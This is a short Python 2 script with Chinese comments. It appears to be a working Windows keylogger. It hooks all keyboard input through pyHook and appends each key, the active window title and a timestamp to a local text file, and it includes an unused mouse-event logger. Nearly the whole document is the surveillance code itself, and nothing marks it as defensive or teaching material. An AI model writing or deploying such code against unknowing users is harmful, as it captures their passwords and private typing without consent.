# -*- coding: utf-8 -*- #
import pythoncom
import pyHook
import datetime
oldname = ''

def onMouseEvent(event):
    # 监听鼠标事件
    print "MessageName:", event.MessageName
    #print "Message:", event.Message
    print "Time:", datetime.datetime.now()
    #print "Window:", event.Window
    print "WindowName:", event.WindowName
    print "Position:", event.Position
    #print "Wheel:", event.Wheel
    #print "Injected:", event.Injected
    print "---"
    # 返回 True 以便将事件传给其它处理程序
    # 注意，这儿如果返回 False ，则鼠标事件将被全部拦截
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True


def onKeyboardEvent(event):
    # 监听键盘事件
    timeNow = datetime.datetime.now()
    Now = timeNow.strftime('%H:%M:%S')
    wrfile = open(r'd://test1.txt', 'a')
    evtname = event.WindowName
    global oldname
    while evtname != oldname:
        wrfile.write( "---------\n")
        wrfile.write( "WindowName:%s\n" % event.WindowName)
        wrfile.write( "Time:%s\n" % datetime.datetime.now())
        oldname = event.WindowName
    wrfile.write( "     Key:%s              %s\n" % (event.Key, Now))
    #---code-debug-using---
    #evtname = event.WindowName
    #global oldname
    #while evtname != oldname:
    #    print "windowsName:",event.WindowName
    #    oldname = event.WindowName
    #print "Key:",event.Key
    #---                ---
    return True


def main():
    # 创建一个“钩子”管理对象
    hm = pyHook.HookManager()
    # 监听所有键盘事件
    hm.KeyDown = onKeyboardEvent
    # 设置键盘“钩子”
    hm.HookKeyboard()

    # 监听所有鼠标事件
    #hm.MouseAll = onMouseEvent
    # 设置鼠标“钩子”
    #hm.HookMouse()

    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()


if __name__ == "__main__":
    main()


